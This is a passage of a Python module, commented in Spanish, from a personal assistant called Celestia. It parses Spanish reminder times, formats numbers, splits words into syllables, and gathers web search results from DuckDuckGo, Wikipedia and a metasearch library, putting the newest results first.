"""AgentTools: catálogo de herramientas que Celestia puede invocar.

Incluye: leer/escribir archivos (con sandbox de rutas), buscar en internet,
crear documentos, generar imágenes, ejecutar comandos shell (con whitelist),
recordatorios, manejo de vault, control de domótica.

Extraído del monolito en sesión 15.
"""
from __future__ import annotations

import base64
import html as _html
import json
import logging
import os
import random
import re
import shlex
import shutil
import subprocess
import sys
import tempfile
import time
import urllib.parse
import urllib.request
import xml.etree.ElementTree as ET
from datetime import datetime, timedelta
from pathlib import Path
from typing import Any, Dict, List, Optional, Tuple

# Sesión 74 — lo que ha devuelto buscar_web y cuándo. El orquestador lo usa de
# fuente para comprobar los enlaces de la respuesta: una búsqueda forzada a
# mitad de turno no pasa por su `web_context`. Solo lo último; no es una caché.
_RESULTADOS_RECIENTES: List[Tuple[float, str]] = []


def resultados_desde(t0: float) -> str:
    """Todo lo que buscar_web ha devuelto desde el instante `t0`, junto."""
    return "\n".join(txt for ts, txt in list(_RESULTADOS_RECIENTES) if ts >= t0)


def _apuntar_resultado(texto: str) -> None:
    _RESULTADOS_RECIENTES.append((time.time(), texto))
    del _RESULTADOS_RECIENTES[:-6]

from . import actividad
from .connectivity import ConnectivityManager
from .domotica import DomoticaManager
from .paths import (DATOS, DOCUMENTOS_DIR, ES_ANDROID, IMAGENES_DIR, MEM_DIR, ROOT,
                    SALIDA_DIR, SIN_MOVIL, SKILLS_DIR)
from .reminders import ReminderManager
from .tz import ahora_usuario
from .vault import GestorContrasenas


# Lo más que se trae una imagen generada. Con `read()` entero, un servidor que
# devolviera algo grande se comía la RAM del móvil (22 sep, revisión de Codex).
MAX_IMAGEN_BYTES = 20 * 1024 * 1024



# ── Cómo se llama, en cristiano, lo que está haciendo cada herramienta ──────
# El chat lo enseña al lado del logo. Solo están las que tardan lo bastante
# como para que dé tiempo a leerlas; el resto se anuncian con su propio nombre,
# que ya es descriptivo («contar_letras» → «contar letras»).
_TOOLS_QUE_BUSCAN = frozenset({
    "buscar_web", "buscar_noticias", "convertir_divisa", "consultar_clima",
    "hora_ciudad", "dias_hasta",
})
_TOOLS_QUE_LEEN = frozenset({
    "leer_archivo", "listar_archivos", "buscar_archivos", "buscar_duplicados",
    "capturar_pantalla", "info_sistema", "guardian_sistema", "control_movil",
})
_NOMBRE_TOOL = {
    "buscar_web": "en internet",
    "buscar_noticias": "las noticias",
    "consultar_clima": "el tiempo",
    "convertir_divisa": "el cambio de divisa",
    "crear_documento": "escribiendo el documento",
    "generar_imagen": "dibujando la imagen",
    "capturar_pantalla": "la pantalla",
    "control_movil": "si puedo manejar tu móvil",
    "leer_archivo": "un archivo",
    "listar_archivos": "la carpeta",
    "buscar_archivos": "entre tus archivos",
    "buscar_duplicados": "duplicados",
    "info_sistema": "el sistema",
    "guardian_sistema": "el sistema",
    "hora_ciudad": "la hora de allí",
    "aprender_habilidad": "aprendiendo una habilidad nueva",
    "descargar_archivo": "descargando",
    "organizar_archivos": "ordenando archivos",
}


def _fase_de_tool(tool: str) -> Tuple[str, str]:
    """(fase del logo, detalle) para la herramienta que se va a ejecutar."""
    if tool in _TOOLS_QUE_BUSCAN:
        fase = "buscando"
    elif tool in _TOOLS_QUE_LEEN:
        fase = "leyendo"
    else:
        fase = "actuando"
    return fase, _NOMBRE_TOOL.get(tool, tool.replace("_", " "))


def _aplicar_ampm(h: int, sufijo: Optional[str]) -> int:
    """Sesión 32 (BUG-S111): convierte hora 12h a 24h con sufijo AM/PM.
    Acepta "am"/"pm"/"a.m."/"p.m." (mayúsculas o minúsculas, con o sin puntos).
    Sin sufijo, devuelve la hora tal cual."""
    if not sufijo:
        return h
    s = sufijo.lower().replace(".", "").replace(" ", "")
    if s in ("pm", "p"):
        return h + 12 if h < 12 else h
    if s in ("am", "a"):
        return 0 if h == 12 else h
    return h


def _parse_reminder_time(tiempo: str) -> Optional[float]:
    """Convierte expresiones de tiempo en español a segundos-desde-ahora.

    Acepta:
      - "en 30 minutos", "en 2 horas", "en 1 día", "en 45 segundos"
      - "a las 18:00", "a las 10", "a las 6 de la tarde", "a las 10 de la mañana"
      - "a las 3 PM", "a las 10 AM" (sesión 32 BUG-S111)
      - "hoy", "mañana", "pasado mañana", "el lunes"…"el domingo"
      - combinaciones: "mañana a las 10", "el lunes a las 9 de la mañana"
    Devuelve None si no logra parsear o si el momento ya pasó.
    """
    if not tiempo:
        return None
    t = tiempo.strip().lower()
    # Sesión 32 (BUG-S110): «dentro de N {unidad}» es sinónimo común de «en N
    # {unidad}». Antes el parser solo aceptaba «en», así que «dentro de 7 días
    # pagar la luz» pedía al usuario reformular.
    t = re.sub(r"^dentro\s+de\s+", "en ", t)

    # 1) "en N {unidad}"
    m = re.match(
        r"en\s+(\d+)\s*(seg(?:undos?)?|s|min(?:utos?)?|m|h(?:oras?)?|"
        r"d[ií]as?|d)\b", t)
    if m:
        n = int(m.group(1))
        u = m.group(2)
        if u.startswith("s") and not u.startswith("se"):
            mult = 1
        elif u.startswith("s"):  # seg/segundo
            mult = 1
        elif u.startswith("m"):  # min/minuto/m
            mult = 60
        elif u.startswith("h"):
            mult = 3600
        elif u.startswith("d"):
            mult = 86400
        else:
            return None
        return float(n * mult)

    # 1b) "en {N escrito} {unidad}" + opcional "y media/cuarto".
    # Bug sesión 26: "Despiértame en una hora y media" no parseaba porque solo
    # se aceptaban dígitos. Ahora acepta una, dos, tres, … y "media hora",
    # "hora y media", "hora y cuarto".
    NUM_ES = {"una": 1, "un": 1, "dos": 2, "tres": 3, "cuatro": 4, "cinco": 5,
              "seis": 6, "siete": 7, "ocho": 8, "nueve": 9, "diez": 10,
              "media": 0.5}
    m2 = re.match(
        r"en\s+(?:(media|una?|dos|tres|cuatro|cinco|seis|siete|ocho|nueve|diez)\s+)?"
        r"(seg(?:undos?)?|min(?:utos?)?|horas?|d[íi]as?)"
        r"(?:\s+y\s+(medi[ao]|cuarto))?", t)
    if m2:
        num_str = m2.group(1) or "una"  # "en hora" = "en una hora"
        unidad = m2.group(2)
        sufijo = m2.group(3)  # "media" o "cuarto"
        n = NUM_ES.get(num_str, 1)
        if unidad.startswith("seg"):
            mult = 1
        elif unidad.startswith("min"):
            mult = 60
        elif unidad.startswith("hora"):
            mult = 3600
        elif unidad.startswith("d"):
            mult = 86400
        else:
            mult = None
        if mult is not None:
            total = n * mult
            if sufijo and sufijo.startswith("medi"):
                total += mult * 0.5
            elif sufijo == "cuarto":
                total += mult * 0.25
            if total > 0:
                return float(total)

    # 2) Día relativo o de la semana, opcionalmente con hora.
    DIAS = {
        "lunes": 0, "martes": 1, "miércoles": 2, "miercoles": 2,
        "jueves": 3, "viernes": 4, "sábado": 5, "sabado": 5, "domingo": 6,
    }
    # Sesión 30 bug AU: usar TZ del usuario, no del server (que puede ser UTC).
    # ahora es aware en Europe/Madrid (o lo que sea TZ_USUARIO). El cálculo
    # de delta abajo es correcto porque restamos dos aware datetimes.
    ahora = ahora_usuario()
    fecha_obj: Optional[datetime] = None

    # 2.5) Fecha explícita "el N de MES (de AÑO)? (a las HH(:MM)? ...)?".
    # Sesión 32 (BUG-S109): antes «recuérdame el 30 de febrero a las 10»
    # programaba para «a las 10» con mensaje «el 30 de febrero» — no validaba
    # que la fecha existiera. Ahora valida días por mes y rechaza imposibles.
    MESES = {"enero": 1, "febrero": 2, "marzo": 3, "abril": 4,
             "mayo": 5, "junio": 6, "julio": 7, "agosto": 8,
             "septiembre": 9, "setiembre": 9, "octubre": 10,
             "noviembre": 11, "diciembre": 12}
    m_fec = re.match(
        r"(?:el\s+)?(\d{1,2})\s+de\s+(\w+)(?:\s+de\s+(\d{4}))?"
        r"(?:\s+a\s+las?\s+(\d{1,2})(?::(\d{2}))?"
        r"(?:\s*(am|pm|a\.?\s*m\.?|p\.?\s*m\.?))?"
        r"(?:\s+de\s+la\s+(\w+))?)?\s*$",
        t, re.I)
    if m_fec:
        dia = int(m_fec.group(1))
        mes_nombre = m_fec.group(2).lower().replace("é", "e")
        if mes_nombre in MESES:
            mes = MESES[mes_nombre]
            anio = int(m_fec.group(3)) if m_fec.group(3) else ahora.year
            if mes == 2:
                bisiesto = (anio % 4 == 0 and
                            (anio % 100 != 0 or anio % 400 == 0))
                dia_max = 29 if bisiesto else 28
            elif mes in (4, 6, 9, 11):
                dia_max = 30
            else:
                dia_max = 31
            if 1 <= dia <= dia_max:
                h = int(m_fec.group(4)) if m_fec.group(4) else 9
                mi = int(m_fec.group(5)) if m_fec.group(5) else 0
                ampm_fec = m_fec.group(6)
                periodo = m_fec.group(7)
                # Sesión 32 (BUG-S111): aplicar AM/PM si presente.
                h = _aplicar_ampm(h, ampm_fec)
                if periodo in ("tarde", "noche") and h < 12:
                    h += 12
                elif periodo == "mañana" and h == 12:
                    h = 0
                if 0 <= h <= 23 and 0 <= mi <= 59:
                    try:
                        fecha_obj = ahora.replace(
                            year=anio, month=mes, day=dia,
                            hour=h, minute=mi, second=0, microsecond=0,
                        )
                    except ValueError:
                        fecha_obj = None
                    if (fecha_obj is not None
                        and not m_fec.group(3)
                        and fecha_obj <= ahora):
                        try:
                            fecha_obj = fecha_obj.replace(year=ahora.year + 1)
                        except ValueError:
                            fecha_obj = None
            # Si fecha inválida (30 de febrero, 31 de junio), seguimos sin
            # fecha_obj y caemos a None al final → caller responde error.

    # 2.6) Fecha numérica "DD/MM(/YYYY)? (a las HH(:MM)? (AM/PM)?)?".
    # Sesión 32 (BUG-S112): «recuérdame el 15/06/2026 a las 10 reunion»
    # caía al LLM que alucinaba la confirmación sin programar nada.
    if fecha_obj is None:
        m_num = re.match(
            r"(?:el\s+)?(\d{1,2})[/\-](\d{1,2})(?:[/\-](\d{2,4}))?"
            r"(?:\s+a\s+las?\s+(\d{1,2})(?::(\d{2}))?"
            r"(?:\s*(am|pm|a\.?\s*m\.?|p\.?\s*m\.?))?)?\s*$",
            t, re.I)
        if m_num:
            dia_n = int(m_num.group(1))
            mes_n = int(m_num.group(2))
            anio_str = m_num.group(3)
            if anio_str:
                anio_n = int(anio_str)
                if anio_n < 100:
                    anio_n += 2000
            else:
                anio_n = ahora.year
            if 1 <= mes_n <= 12:
                if mes_n == 2:
                    bis_n = (anio_n % 4 == 0 and
                             (anio_n % 100 != 0 or anio_n % 400 == 0))
                    dmax_n = 29 if bis_n else 28
                elif mes_n in (4, 6, 9, 11):
                    dmax_n = 30
                else:
                    dmax_n = 31
                if 1 <= dia_n <= dmax_n:
                    h_n = int(m_num.group(4)) if m_num.group(4) else 9
                    mi_n = int(m_num.group(5)) if m_num.group(5) else 0
                    ampm_n = m_num.group(6)
                    h_n = _aplicar_ampm(h_n, ampm_n)
                    if 0 <= h_n <= 23 and 0 <= mi_n <= 59:
                        try:
                            fecha_obj = ahora.replace(
                                year=anio_n, month=mes_n, day=dia_n,
                                hour=h_n, minute=mi_n,
                                second=0, microsecond=0,
                            )
                        except ValueError:
                            fecha_obj = None
                        if (fecha_obj is not None and not anio_str
                            and fecha_obj <= ahora):
                            try:
                                fecha_obj = fecha_obj.replace(
                                    year=ahora.year + 1)
                            except ValueError:
                                fecha_obj = None

    m_dia = re.match(
        r"(?:(hoy|ma[ñn]ana|pasado\s+ma[ñn]ana)|"
        r"el\s+(lunes|martes|mi[eé]rcoles|jueves|viernes|s[aá]bado|domingo))"
        r"(?:\s+a\s+las?\s+(\d{1,2})(?::(\d{2}))?"
        r"(?:\s*(am|pm|a\.?\s*m\.?|p\.?\s*m\.?))?"
        r"(?:\s+de\s+la\s+(\w+))?)?\s*$",
        t, re.I)
    if m_dia:
        rel, dia_sem, hh, mm, ampm_dia, periodo = m_dia.groups()
        if rel == "hoy":
            base = ahora
        elif rel and rel.startswith("ma"):  # mañana
            base = ahora + timedelta(days=1)
        elif rel:  # pasado mañana
            base = ahora + timedelta(days=2)
        else:
            target = DIAS[dia_sem.replace("é", "e").replace("á", "a")]
            delta = (target - ahora.weekday()) % 7
            if delta == 0:
                delta = 7  # "el lunes" hablando un lunes → próximo lunes
            base = ahora + timedelta(days=delta)
        if hh is not None:
            h = int(hh)
            mi = int(mm) if mm else 0
            # Sesión 32 (BUG-S111): aplicar AM/PM si presente.
            h = _aplicar_ampm(h, ampm_dia)
            if periodo in ("tarde", "noche") and h < 12:
                h += 12
            elif periodo == "mañana" and h == 12:
                h = 0
            # Sesión 31 (BUG-M): validar rango antes de `replace()`. Antes el
            # ValueError de `replace(hour=25, ...)` se propagaba como "Error
            # en recordatorio: hour must be in 0..23" — feo al usuario.
            if not (0 <= h <= 23 and 0 <= mi <= 59):
                return None
            fecha_obj = base.replace(hour=h, minute=mi, second=0, microsecond=0)
        else:
            fecha_obj = base.replace(hour=9, minute=0, second=0, microsecond=0)

    # 3) Sólo "a las HH(:MM)?" (sin día) → hoy; si ya pasó, mañana
    # Acepta también orden invertido "a las HH:MM mañana/hoy/pasado mañana"
    # (sesión 29: "Y a las 14:30 mañana, ir al banco" no parseaba).
    if fecha_obj is None:
        m_hora = re.match(
            r"a\s+las?\s+(\d{1,2})(?::(\d{2}))?"
            r"(?:\s*(am|pm|a\.?\s*m\.?|p\.?\s*m\.?))?"
            r"(?:\s+de\s+la\s+(\w+))?"
            r"(?:\s+(hoy|ma[ñn]ana|pasado\s+ma[ñn]ana))?\s*$", t,
            re.I)
        if m_hora:
            h = int(m_hora.group(1))
            mi = int(m_hora.group(2)) if m_hora.group(2) else 0
            ampm = m_hora.group(3)
            periodo = m_hora.group(4)
            dia_rel = m_hora.group(5)  # hoy / mañana / pasado mañana
            # Sesión 32 (BUG-S111): aplicar sufijo AM/PM si presente.
            h = _aplicar_ampm(h, ampm)
            if periodo in ("tarde", "noche") and h < 12:
                h += 12
            elif periodo == "mañana" and h == 12:
                h = 0
            # Sesión 31 (BUG-M): validar rango antes de `replace()`.
            if not (0 <= h <= 23 and 0 <= mi <= 59):
                return None
            if dia_rel and dia_rel.startswith("ma"):  # mañana
                base = ahora + timedelta(days=1)
            elif dia_rel and dia_rel.startswith("pasado"):
                base = ahora + timedelta(days=2)
            else:
                base = ahora  # hoy o sin día explícito
            fecha_obj = base.replace(hour=h, minute=mi, second=0, microsecond=0)
            if fecha_obj <= ahora:
                fecha_obj += timedelta(days=1)

    if fecha_obj is None:
        return None
    delta_s = (fecha_obj - ahora).total_seconds()
    return delta_s if delta_s > 0 else None

logger = logging.getLogger("celestia_v1")

# Dependencia opcional
try:
    import requests as _req
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False
    _req = None  # type: ignore[assignment]


def numero_es(x: float, decimales: int = 2, fijos: bool = False) -> str:
    """Un número escrito como se escribe en español: 1.234,56.

    Sesión 58. Había tres formas distintas de escribir un número en el mismo
    fichero: la cotización de criptomonedas usaba coma decimal, `convertir_divisa`
    punto («100 USD = 85.96 EUR»), y `porcentaje` devolvía el número pelado, o
    sea punto también. Al mismo usuario, en la misma conversación. Estaba
    apuntado como deuda desde la sesión 37.

    Por defecto los enteros salen **sin** decimales («36», no «36,00»): es lo
    natural al hablar. `fijos=True` los conserva, que es lo que quiere un
    precio — «68.247,00 €» y no «68.247 €». Los dos comportamientos ya
    existían por separado antes de unificar esto, y los dos son correctos en
    su sitio: unificar el formato no era motivo para cambiar ninguno.
    """
    try:
        n = float(x)
    except (TypeError, ValueError):
        return str(x)
    if n.is_integer() and abs(n) < 1e15 and not fijos:
        return f"{int(n):,}".replace(",", ".")
    # El truco del \x00: intercambiar «,» y «.» sin pisarse a medio camino.
    return f"{n:,.{decimales}f}".replace(",", "\x00").replace(".", ",").replace("\x00", ".")


def _silabear_es(palabra: str) -> list:
    """Separa una palabra española en sílabas por reglas (determinista).

    Maneja: diptongos/triptongos vs hiatos (incl. débil tónica con tilde),
    grupos consonánticos inseparables (pr, br, tr, dr, cr, gr, fr, pl, bl, cl,
    gl, fl, ll, rr, ch) y el reparto de 1/2/3+ consonantes entre núcleos.
    Verificado: anticonstitucionalmente→an-ti-cons-ti-tu-cio-nal-men-te,
    aéreo→a-é-re-o, murciélago→mur-cié-la-go, día→dí-a, búho→bú-ho.
    """
    w = palabra.lower()
    n = len(w)
    V = "aeiouáéíóúàèìòùüï"
    FUERTE = "aeoáéóàèò"
    DEBIL_AC = "íúìù"
    INSEP = {"pr", "br", "tr", "dr", "cr", "gr", "fr",
             "pl", "bl", "cl", "gl", "fl", "ll", "rr", "ch"}
    # 1) núcleos vocálicos (agrupando diptongos/triptongos; separando hiatos)
    nuc = []
    i = 0
    while i < n:
        if w[i] in V:
            j = i
            while j + 1 < n and w[j + 1] in V:
                a, b = w[j], w[j + 1]
                hiato = (a in FUERTE and b in FUERTE) or (a in DEBIL_AC) or (b in DEBIL_AC)
                if hiato:
                    break
                j += 1
            nuc.append((i, j))
            i = j + 1
        else:
            i += 1
    if len(nuc) <= 1:
        return [palabra]
    # 2) repartir consonantes entre núcleos consecutivos
    silabas = []
    start = 0
    for k in range(len(nuc) - 1):
        fin = nuc[k][1]
        cons = w[fin + 1:nuc[k + 1][0]]
        c = len(cons)
        if c <= 1:
            corte = fin + 1                       # V-CV (o V-V)
        elif c == 2:
            corte = fin + 1 if cons in INSEP else fin + 2
        elif c == 3:
            corte = fin + 2 if cons[1:] in INSEP else fin + 3
        else:
            corte = fin + 3 if cons[2:] in INSEP else fin + 4
        silabas.append(palabra[start:corte])
        start = corte
    silabas.append(palabra[start:])
    return silabas


def _palabras_sin_tildes(texto: str) -> set:
    import unicodedata
    plano = unicodedata.normalize("NFKD", (texto or "").lower())
    plano = "".join(ch for ch in plano if not unicodedata.combining(ch))
    return {p for p in re.split(r"[^a-z0-9]+", plano) if len(p) > 2}


def elegir_habilidad(peticion: str, skills) -> Optional[Path]:
    """La habilidad que nombra la petición, aunque traiga datos detrás.

    «sumar números 5 y 6» tiene que dar con `sumar_numeros.py`: el nombre va
    delante y lo demás son los datos que el script lee de sys.argv[1]. Gana la
    que tenga más palabras de su nombre en la petición, y hace falta que estén
    al menos dos tercios (una sola palabra suelta no basta para ejecutar nada).
    """
    pedidas = _palabras_sin_tildes(peticion)
    mejor, mejor_nota = None, 0.0
    for s in skills:
        propias = _palabras_sin_tildes(s.stem.replace("_", " "))
        if not propias:
            continue
        acierto = len(propias & pedidas)
        if acierto / len(propias) < 2 / 3:
            continue
        nota = acierto + acierto / len(propias)
        if nota > mejor_nota:
            mejor, mejor_nota = s, nota
    return mejor


class AgentTools:
    """Ejecuta herramientas del agente. Principio: consentimiento explícito siempre."""

    SAFE_READ_LIMIT = 8000

    def __init__(self, connectivity: Optional[ConnectivityManager] = None,
                 reminder_mgr: Optional[ReminderManager] = None):
        self.connectivity = connectivity
        self._reminder_mgr = reminder_mgr
        self._domotica = DomoticaManager()
        self._vault = GestorContrasenas()

    # Cadena de búsqueda: DDG Instant → Wikipedia (es/en) → DDG HTML scraping.
    # DDG Instant cubre Wikipedia/calculator/conversions de forma compacta.
    # Wikipedia API es gratis sin key, devuelve extractos limpios — útil
    # cuando DDG no tiene Instant Answer. DDG HTML (POST) extrae snippets
    # de resultados reales para queries de actualidad sin entrada en Wiki.
    # Bug visto sesión 28: con sólo DDG Instant + lite scraping, "capital de
    # Argentina" devolvía "Sin resultados" porque DDG no tiene Instant para
    # esa query y el `lite` no extrae el resultado top.

    def _ddg_instant(self, query: str) -> str:
        """DuckDuckGo Instant Answer API — Wikipedia compacta, cálculos, conversiones."""
        try:
            r = _req.get(
                "https://api.duckduckgo.com/",
                params={"q": query, "format": "json", "no_html": "1", "skip_disambig": "1"},
                headers={"User-Agent": "Celestia/1.5"}, timeout=10,
            )
            try:
                data = r.json()
            except Exception:
                return ""
            out = data.get("AbstractText") or data.get("Answer") or ""
            if not out and data.get("RelatedTopics"):
                out = "\n".join(
                    t.get("Text", "") for t in data["RelatedTopics"][:3]
                    if isinstance(t, dict) and t.get("Text")
                )
            if out and data.get("AbstractURL"):
                out += f"\nFuente: {data['AbstractURL']}"
            return out.strip()
        except Exception:
            return ""

    def _wikipedia_extract(self, query: str, lang: str = "es") -> str:
        """Wikipedia API: busca el primer match y devuelve su extracto en texto plano.

        Usamos `opensearch` para resolver el título (incluye fuzzy match) y
        después `query/extracts` para el contenido. Sin key, gratis, oficial.
        """
        try:
            # Paso 1: resolver título mediante opensearch
            r1 = _req.get(
                f"https://{lang}.wikipedia.org/w/api.php",
                params={"action": "opensearch", "search": query, "limit": 1, "format": "json"},
                headers={"User-Agent": "Celestia/1.5 (es)"}, timeout=10,
            )
            try:
                opensearch = r1.json()
            except Exception:
                return ""
            if not isinstance(opensearch, list) or len(opensearch) < 4:
                return ""
            titulos = opensearch[1]
            urls = opensearch[3]
            if not titulos:
                return ""
            titulo = titulos[0]
            url = urls[0] if urls else ""

            # Paso 2: pedir el extracto plano de la intro
            r2 = _req.get(
                f"https://{lang}.wikipedia.org/w/api.php",
                params={
                    "action": "query", "prop": "extracts",
                    "exintro": "true", "explaintext": "true",
                    "format": "json", "titles": titulo,
                },
                headers={"User-Agent": "Celestia/1.5 (es)"}, timeout=10,
            )
            try:
                data = r2.json()
            except Exception:
                return ""
            paginas = (data.get("query") or {}).get("pages") or {}
            for _, pag in paginas.items():
                extract = (pag.get("extract") or "").strip()
                if extract:
                    if url:
                        extract += f"\nFuente: {url}"
                    return extract
            return ""
        except Exception:
            return ""

    @staticmethod
    def _texto_plano(html: str) -> str:
        """Quita etiquetas y colapsa espacios de un fragmento de HTML."""
        return re.sub(r"\s+", " ", re.sub(r"<[^>]+>", " ", html)).strip()

    def _ddg_html_scrape(self, query: str) -> str:
        """Scraping de html.duckduckgo.com (POST). Resultados reales con snippet.

        Más robusto que el `lite.duckduckgo.com` anterior — el HTML completo
        sí tiene snippets indexables con `class="result__snippet"`.
        """
        try:
            r = _req.post(
                "https://html.duckduckgo.com/html/",
                data={"q": query},
                headers={"User-Agent": "Mozilla/5.0 (Celestia/1.5)"},
                timeout=10,
            )
            # Buscamos snippets de resultados no-publicitarios.
            # Patrón: <a class="result__snippet" ...>TEXTO</a>
            snippets = re.findall(
                r'class=["\']result__snippet["\'][^>]*>(.*?)</a>',
                r.text, re.DOTALL,
            )
            if not snippets:
                # Algunos resultados usan estructura distinta; intentar snippet sin href
                snippets = re.findall(
                    r'<div class="snippet">(.*?)</div>', r.text, re.DOTALL,
                )
            # Los TÍTULOS también entran (sesión 44). Muchos snippets son puro
            # relleno SEO («cuatro contendientes de frontera») mientras que el
            # título lleva el dato («Claude vs GPT-5 vs Gemini, agosto 2026»).
            # Sin ellos el modelo se quedaba sin nombres concretos y rellenaba
            # el hueco con su conocimiento caducado.
            titulos = re.findall(
                r'class=["\']result__a["\'][^>]*>(.*?)</a>', r.text, re.DOTALL,
            )
            # Los enlaces, para poder abrir la página si el resumen no basta.
            # DuckDuckGo los envuelve en /l/?uddg=<url codificada>.
            enlaces = re.findall(r'class=["\']result__a["\'][^>]*href=["\']([^"\']+)', r.text)
            if not enlaces:
                enlaces = re.findall(r'href=["\'](//duckduckgo\.com/l/\?uddg=[^"\']+)', r.text)
            urls = []
            for href in enlaces[:5]:
                m = re.search(r"uddg=([^&]+)", href)
                urls.append(urllib.parse.unquote(m.group(1)) if m else href)
            self._ultimas_urls = [u for u in urls if u.startswith("http")]
            limpios = []
            for i in range(max(len(snippets), len(titulos))):
                titulo = self._texto_plano(titulos[i]) if i < len(titulos) else ""
                cuerpo = self._texto_plano(snippets[i]) if i < len(snippets) else ""
                if cuerpo and len(cuerpo) <= 30:   # ruido: «Ver más», fechas sueltas
                    cuerpo = ""
                if cuerpo and titulo and cuerpo.lower().startswith(titulo.lower()[:40]):
                    titulo = ""                    # el snippet repite el título
                if titulo and cuerpo:
                    limpios.append(f"{titulo} — {cuerpo}")
                elif titulo or cuerpo:
                    limpios.append(titulo or cuerpo)
                if len(limpios) >= 8:              # 8 resultados, no 3
                    break
            return "\n".join(self._primero_los_que_traen_el_dato(query, limpios))
        except Exception:
            return ""

    # ── Metabuscador (ddgs): el SearXNG de los aparatos que no lo tienen ──
    # En el móvil buscaba el SearXNG propio (varios buscadores a la vez).
    # Instalada en un PC no hay SearXNG y todo dependía del HTML de
    # DuckDuckGo, que a la tercera búsqueda seguida contesta un captcha (202).
    # `ddgs` reparte entre varios buscadores y habla como un navegador de
    # verdad: 12 búsquedas seguidas el 4 oct 2026, las 12 con resultados
    # buenos, ~2 s cada una. Bing a pelo se descartó: a un programa le
    # devuelve páginas que sólo coinciden en una palabra («precio del bitcoin»
    # → tasas de la Comunidad de Madrid). En la app de Android no existe
    # (su motor HTTP no está compilado para Android) y se sigue sin él.
    def _ddgs(self, query: str) -> str:
        """Resultados de ddgs (título — resumen). Vacío si no está o falla."""
        try:
            from ddgs import DDGS
        except ImportError:
            return ""
        try:
            resultados = DDGS(timeout=10).text(query, region="es-es", max_results=8,
                                               backend="auto") or []
        except (KeyboardInterrupt, SystemExit):
            raise
        except BaseException as e:
            # BaseException y no Exception: un fallo dentro de primp (Rust)
            # llega como PanicException, que no hereda de Exception, y se
            # llevaba por delante la petición entera (visto en Android).
            logger.info("ddgs no respondió (%s: %s) — sigue la cadena",
                        type(e).__name__, str(e)[:120])
            return ""
        pares = []                                   # (fila, url) en el orden del buscador
        for res in resultados:
            titulo = self._texto_plano(res.get("title") or "")
            cuerpo = self._texto_plano(res.get("body") or "")
            if cuerpo and len(cuerpo) <= 30:
                cuerpo = ""
            fila = f"{titulo} — {cuerpo}" if (titulo and cuerpo) else (titulo or cuerpo)
            url = str(res.get("href") or "")
            if fila:
                pares.append((fila, url if url.startswith("http") else ""))
        if not pares:
            return ""
        if self._PIDE_ACTUALIDAD_RE.search(query or ""):
            pares = self._lo_mas_reciente_primero(pares)
        filas = [f for f, _u in pares]
        self._ultimas_urls = [u for _f, u in pares if u][:5]
        logger.info("ddgs respondió (%d resultados)", len(filas))
        return "\n".join(self._primero_los_que_traen_el_dato(query, filas))

    # ── Lo más reciente primero ─────────────────────────────────────────
    # 4 oct 2026, «¿quién ganó el último Gran Premio de Fórmula 1?»: entre los
    # resultados estaba la carrera de esa misma mañana («11 hours ago»), pero
    # detrás de las de agosto y septiembre, y el modelo contestó con la de
    # agosto. Los buscadores ponen la fecha delante del resumen («Aug 23, 2026
    # ·», «11 hours ago ·», «hace 3 días ·»): con una pregunta de actualidad,
    # los que la llevan se ordenan del más nuevo al más viejo; los que no la
    # llevan (una ficha de Wikipedia) van detrás, en su orden.
    _MESES_FECHA = {"jan": 1, "ene": 1, "feb": 2, "mar": 3, "apr": 4, "abr": 4, "may": 5,
                    "jun": 6, "jul": 7, "aug": 8, "ago": 8, "sep": 9, "set": 9, "oct": 10,
                    "nov": 11, "dec": 12, "dic": 12}
    _HACE_RE = re.compile(
        r"\b(?:(\d+)\s+(minute|hour|day|week|month)s?\s+ago|"
        r"hace\s+(\d+)\s+(minuto|hora|d[ií]a|semana|mes)(?:s|es)?)\b", re.IGNORECASE)
    _FECHA_EN_RE = re.compile(r"\b([A-Za-z]{3})[a-z]*\.?\s+(\d{1,2}),\s+(\d{4})\b")
    _FECHA_ES_RE = re.compile(r"\b(\d{1,2})\s+(?:de\s+)?([a-zA-Z]{3})[a-z]*\.?\s+(?:de\s+)?(\d{4})\b")

    @classmethod
    def _fecha_del_resultado(cls, fila: str) -> Optional[float]:
        """La fecha (como marca de tiempo) que el buscador puso al resultado."""
        cabeza = fila.split(" — ", 1)[-1][:60]          # la fecha va al principio del resumen
        m = cls._HACE_RE.search(cabeza)
        if m:
            n = int(m.group(1) or m.group(3))
            unidad = (m.group(2) or m.group(4) or "").lower()[:3]
            segundos = {"min": 60, "hou": 3600, "hor": 3600, "day": 86400, "día": 86400,
                        "dia": 86400, "wee": 604800, "sem": 604800, "mon": 2592000,
                        "mes": 2592000}.get(unidad, 86400)
            return time.time() - n * segundos
        for patron, orden in ((cls._FECHA_EN_RE, ("mes", "dia", "anio")),
                              (cls._FECHA_ES_RE, ("dia", "mes", "anio"))):
            m = patron.search(cabeza)
            if not m:
                continue
            partes = dict(zip(orden, m.groups()))
            mes = cls._MESES_FECHA.get(partes["mes"][:3].lower())
            if not mes:
                continue
            try:
                return datetime(int(partes["anio"]), mes, int(partes["dia"])).timestamp()
            except ValueError:
                continue
        return None

    @classmethod
    def _lo_mas_reciente_primero(cls, pares: list) -> list:
        fechados = [(cls._fecha_del_resultado(f), i) for i, (f, _u) in enumerate(pares)]
        con = sorted((p for p in fechados if p[0] is not None), key=lambda p: -p[0])
        if len(con) < 2:
            return pares
        sin = [i for fecha, i in fechados if fecha is None]
        return [pares[i] for _f, i in con] + [pares[i] for i in sin]

    # ── Enriquecer la query con la fecha (sesión 42) ────────────────────
    # DuckDuckGo devuelve páginas viejas si la query no ancla el momento:
    # «modelo de IA más avanzado» traía un artículo de noviembre de 2025 y
    # Celestia contestaba «Claude 3, Gemini 1.5, Llama 3». Con «agosto 2026»
    # pegado, la misma búsqueda devuelve el ranking del mes en curso.
    # Sólo se añade si la pregunta pide actualidad Y no cita ya un año.
    _PIDE_ACTUALIDAD_RE = re.compile(
        r"\bahora(?:\s+mismo)?\b|\bactual(?:es|mente)?\b|\bhoy\b|"
        r"\b[uú]ltim[oa]s?\b|m[aá]s\s+recient|\bnovedades\b|este\s+a[ñn]o|"
        r"m[aá]s\s+(?:avanzad|potent|nuev|modern|vendid|popular)\w*|"
        r"\bmejor(?:es)?\b|\bversi[oó]n\s+(?:actual|estable)\b|"
        r"\bsigue\s+siendo\b|\btodav[ií]a\b|"
        # Sesión 45 — conceptos que caducan aunque la frase no lleve adverbio
        # temporal. Caso real: «clasificación LaLiga» no se anclaba y acabó en
        # un artículo de Wikipedia sobre la Concacaf de 2019-20.
        r"\bclasificaci[oó]n\b|\btabla\b|\btemporada\b|\bjornada\b|"
